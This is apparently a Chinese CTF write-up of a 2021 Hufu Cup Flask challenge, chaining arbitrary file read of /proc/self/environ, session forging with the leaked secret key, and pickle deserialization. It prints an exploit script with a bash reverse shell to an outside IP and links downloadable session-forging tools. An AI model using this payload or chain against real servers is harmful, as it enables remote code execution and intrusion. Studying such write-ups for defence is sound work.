## ****（一）背景****

前几天与团队成员一起审计复现关于flask框架的反序列化漏洞以及session伪造相关的漏洞。想到了2021年虎符杯线下决赛的这个赛题，也是涉及以上两个漏洞点，故拿出来做个分享与交流。

##  ** **（二）分析****

环境存在任意文件读取漏洞，直接读取/app/source得到如下源码。

审计flask代码需要先看路由以及路由对应的函数代码逻辑比较清晰，/file路由下存在任意文件读取，/admin路由下存在u =
pickle.loads(u) pickle反序列化。

且代码开头处存在这样一个序列化点。

    
    
    User = type('User', (object,),
    
    {     'uname': 'test',     'is_admin': 0,     '__repr__': lambda o: o.uname, })
    
    #!/usr/bin/python3.6
    
    import os
    
    import pickle
    
    from base64 import b64decode
    
    from flask import Flask, request, render_template, session
    
    app = Flask(__name__)
    
    app.config["SECRET_KEY"] = "*******"
    
    User = type('User', (object,), {
    
    'uname': 'test',
    
    'is_admin': 0,
    
    '__repr__': lambda o: o.uname,
    
    })
    
    
    @app.route('/', methods=('GET',))
    
    def index_handler():
    
    if not session.get('u'):
    
    u = pickle.dumps(User())
    
    session['u'] = u
    
    return "/file?file=index.js"
    
    @app.route('/file', methods=('GET',))
    
    def file_handler():
    
    path = request.args.get('file')
    
    path = os.path.join('static', path)
    
    if not os.path.exists(path) or os.path.isdir(path) \
    
    or '.py' in path or '.sh' in path or '..' in path or "flag" in path:
    
    return 'disallowed'
    
    with open(path, 'r') as fp:
    
    content = fp.read()
    
    return content
    
    @app.route('/admin', methods=('GET',))
    
    def admin_handler():
    
    try:
    
    u = session.get('u')
    
    if isinstance(u, dict):#如果u对应的值是字典，会读取  u.b
    
    u = b64decode(u.get('b'))
    
    u = pickle.loads(u)#pickle反序列化
    
    except Exception:
    
    return 'uhh?'
    
    if u.is_admin == 1:
    
    return 'welcome, admin'
    
    else:
    
    return 'who are you?'
    
    if __name__ == '__main__':
    
    app.run('0.0.0.0', port=80, debug=False)

很明显的一个session伪造加pickle反序列化rce。
代码中的secret_key被打码处理，但可以通过任意文件读取从/proc/self/environ
获取环境变量,里面有secret_key可以拿这个secret_key伪造session。

![](https://image.3001.net/images/20220803/1659518174_62ea3cdece48f9ba042a8.png!small)

读取到secret_key如上所示。

在之前的文章中我们提过flask是个轻量级的web框架，其session区别与其他的框架是加密保存在客户端的。所以只要获取到secret_key即可任意的构造我们所需要的session。

![](https://image.3001.net/images/20220803/1659518194_62ea3cf2da64e20c26d37.png!small)

###  ** **关于sess**** ** **ion**** ** **的解释如下所示****

在解析 session 的实现之前，我们先介绍一下 session 怎么使用。session 可以看做是在不同的请求之间保存数据的方法，因为 HTTP
是无状态的协议，但是在业务应用上我们希望知道不同请求是否是同一个人发起的。比如购物网站在用户点击进入购物车的时候，服务器需要知道是哪个用户执行了这个操作。对于我们熟悉的其他web环境中，大部分对session操作都是存入服务器本地文件中，用户看到的只是session的名称（一个随机字符串），其内容保存在服务端。这种就做到了用户无法读取到session，这种叫服务端session。

##  ** **（三）伪造****

所以目前阶段已经获取到了反序列化所需的一切条件，只需要构造我们的反弹shell命令，代入以上的User类进行__reduce__反序列化即可。

__reduce__类似于php里面的构造函数魔术方法，在反序列化的时候自动触发。Exp脚本如下：

    
    
    import pickle
    
    from base64 import b64encode
    
    import os
    
    User = type('User', (object,), {
    
    'uname': 'tyskill',
    
    'is_admin': 0,
    
    '__repr__': lambda o: o.uname,
    
    '__reduce__': lambda o: (os.system, ("bash -c 'bash -i >& /dev/tcp/123.60.47.130/9999 0>&1'",))
    
    })
    
    u = pickle.dumps(User())
    
    print(b64encode(u).decode())

执行结果如下所示 得到序列化字符串:
gANjcG9zaXgKc3lzdGVtCnEAWDUAAABiYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzEyMy42MC40Ny4xMzAvOTk5OSAwPiYxJ3EBhXECUnEDLg==![](https://image.3001.net/images/20220803/1659518236_62ea3d1c939db04a87a95.png!small)

接下来就是伪造session这里附上两个非常不错的工具，有需要的小伙伴可以自取哦！

链接:https://pan.baidu.com/s/1ZYs1wj_1s2Yx6JmweREGRg

密码:5nlt
![](https://image.3001.net/images/20220803/1659518264_62ea3d381e28ee821ab3e.png!small)

执行以下命令，构造session。![](https://image.3001.net/images/20220803/1659518280_62ea3d485244ffeec1065.png!small)

##  ** **（四）反弹shell****

将生成的新session进行替换，再去访问/admin路由即可。![](https://image.3001.net/images/20220803/1659518298_62ea3d5a33d0728935f46.png!small)

监听以后，刷新/admin页面即可触发反序列化。![](https://image.3001.net/images/20220803/1659518311_62ea3d67ad2c2670a6cc9.png!small)

成功反弹shell，flag在/flag目录下。![](https://image.3001.net/images/20220803/1659518324_62ea3d74c716668bbe0e1.png!small)

##  ** **（五）总结****

关于反序列化漏洞一直是红蓝对抗中兵家必争的漏洞点，受限于flask框架的应用以及利用难度，实战中往往java反序列化、php反序列化更多。但漏洞原理以及链条的构造方法从底层逻辑来看都是没有区别的，一通百通。

